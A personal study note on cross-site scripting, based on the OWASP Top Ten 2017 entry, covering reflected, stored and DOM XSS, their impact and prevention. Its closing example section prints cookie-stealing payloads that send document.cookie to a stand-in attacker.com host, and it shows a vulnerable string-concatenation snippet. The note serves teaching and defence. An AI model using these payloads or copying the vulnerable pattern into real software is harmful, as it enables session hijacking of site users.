---
title: XSS
---

## description

xss flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser api that can create html or JavaScript.

xss allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.

**TLDR:** unintended execution of malicious scripts in a website

## link

[https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS))

## overview

### attack vector

* app specific, but generally
* unfiltered input and stuff
* almost all places for [injection flaws](https://owasp.org/www-community/Injection_Flaws)
* ref [[injection]]
* execute scripts (js, php)

### security weakness

* ref [[injection]]
* stupid parsers and filtering

### impact

* moderate for reflected and dom xss
* severe for stored xss
* remote code execution on the victim’s browser
  * steal credentials, sessions
  * deliver malware
* **if xss is present, all [[csrf]] protection is defeated**

## vuln

### reflected xss

* app or api includes unvalidated and unescaped user input as part of html output
* a successful attack can allow the attacker to execute arbitrary html and js in the victim’s browser
* typically the user will need to interact with some malicious link that points to an attacker-controlled page, such as malicious watering hole websites, advertisements, or similar

### stored xss

* app or api stores unsanitized user input that is viewed at a later time by another user or an administrator
* stored xss is often considered a high or critical risk

### dom xss

* js frameworks, single-page applications, and apis that dynamically include attacker-controllable data to a page are vulnerable to dom xss
* ideally, the app would not send attacker-controllable data to unsafe js apis

## prevention

* separate untrusted data and browser content
* frameworks that automatically prevent xss like ruby on rails and react js
* content security policy for xss mitigation
* encoding and escaping properly
  * escape untrusted http req

## attack example

```html
<img src="http://attacker.com/?cookie=" + document.cookie>
```

```js
page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
```

attacker can send the `CC` query as

```html
'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'.
```

and the session cookie is sent to the attacker
